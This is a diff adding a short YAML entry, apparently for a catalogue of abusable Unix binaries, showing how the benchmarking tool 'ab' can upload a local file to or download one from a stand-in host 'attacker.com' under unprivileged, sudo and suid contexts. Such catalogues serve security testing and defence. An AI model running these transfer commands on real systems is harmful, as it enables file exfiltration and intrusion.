@@ -1,0 +1,19 @@
+---
+functions:
+  upload:
+    - code: |-
+        ab -p /path/to/input-file http://attacker.com/
+      receiver: HTTP
+      contexts:
+        unprivileged:
+        sudo:
+        suid:
+  download:
+    - code: |-
+        ab -v2 http://attacker.com/path/to/input-file
+      sender: HTTP
+      contexts:
+        unprivileged:
+        sudo:
+        suid:
+...
